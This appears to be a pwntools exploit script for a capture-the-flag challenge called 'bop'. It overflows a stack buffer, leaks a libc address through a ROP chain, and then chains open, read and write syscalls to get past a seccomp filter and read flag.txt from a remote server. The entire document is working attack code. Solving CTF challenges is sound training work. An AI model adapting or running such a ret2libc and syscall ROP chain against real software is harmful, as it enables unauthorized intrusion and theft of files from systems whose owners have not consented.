# Find Gadget Using not only ROPgadget but also objdump!
from pwn import *
# b* 0x401365

p = remote("mc.ax", 30284)
# p = process("./bop")
e = ELF("./bop")
libc = ELF("./libc-2.31.so")


def slog(symbol, addr): return success(symbol + ": " + hex(addr))


context.log_level = 'debug'

# gdb.attach(p)
# pause()

poprdi = 0x00000000004013d3
poprsi15 = 0x00000000004013d1
poprax = 0x0000000000036174
main = 0x004012f9
ret = 0x000000000040101a

payload = b'A' * 32
payload += b'B'*8

# align stack
payload += p64(ret)

# leak libc addr (printf)
payload += p64(poprdi)
payload += p64(e.got["printf"])
# printf()
payload += p64(e.plt["printf"])

# return to main
# aling stack for printf in second main
payload += p64(ret)
payload += p64(main)

p.sendlineafter("? ", payload)

# leak libc_addr
printf_addr = p.recvn(6)
printf_addr = u64(printf_addr.ljust(8, b"\x00"))
libc_base = printf_addr - libc.symbols["printf"]

# NOT USE! => we can only use ORW syscall
# system = libc_base + libc.symbols["system"]
# # open = libc_base + libc.symbols["__GI___libc_write"]
# # read = libc_base + libc.symbols["read"]
# write = libc_base + 0x000000000113670 + 9
# binsh = libc_base + next(libc.search(b"/bin/sh"))

# syscall = libc_base + 0x000000000113670 + 9
poprax = libc_base + 0x0000000000036174
orraxrdi = libc_base+0x000000000004732f
pushrax = libc_base + 0x0000000000042017
poprdx = libc_base + 0x0000000000142c92

# syscall; ret
libc_syscall = libc_base+0x13a5ab
syscall = libc_syscall

slog("printf_addr :", printf_addr)

# make attack payload
payload = b'A' * 32
payload += b'B'*8
bss = 0x404000

# seccomp bypass => NOT USE
# payload += p64(poprax)
# payload += p64(0x40000000)
# payload += p64(poprdi)
# payload += p64(59)
# payload += p64(orraxrdi)

# input "./flag.txt\x00" in bss
payload += p64(poprdi)
payload += p64(bss)
payload += p64(e.plt["gets"])

# ret2main
payload += p64(main)

p.sendlineafter(b"? ", payload)
p.sendline(b"./flag.txt\x00")

# 2 attack
payload = b'A' * 32
payload += b'B'*8

#  int fd = open(“/tmp/flag”, O_RDONLY, NULL)
# open syscall rax = 2
# open(rdi, rsi, rdx)
payload += p64(poprdx)
payload += p64(0)

payload += p64(poprsi15)
payload += p64(0)
payload += p64(0)

payload += p64(poprax)
payload += p64(2)

payload += p64(poprdi)
payload += p64(bss)

payload += p64(syscall)
# # read
# read(fd, buf, 0x40)
# payload += p64(pushrax)
payload += p64(poprdi)
payload += p64(3)

payload += p64(poprsi15)
payload += p64(bss)
payload += p64(0)

payload += p64(poprdx)
payload += p64(0x40)

payload += p64(poprax)
payload += p64(0)

payload += p64(syscall)

# write(1, buf, 0x40)
payload += p64(poprdi)
payload += p64(1)

payload += p64(poprsi15)
payload += p64(bss)
payload += p64(0)

payload += p64(poprdx)
payload += p64(0x40)

payload += p64(poprax)
payload += p64(1)
payload += p64(syscall)

p.sendlineafter("? ", payload)
flag = p.recvline()

print(str(flag, 'utf-8'))
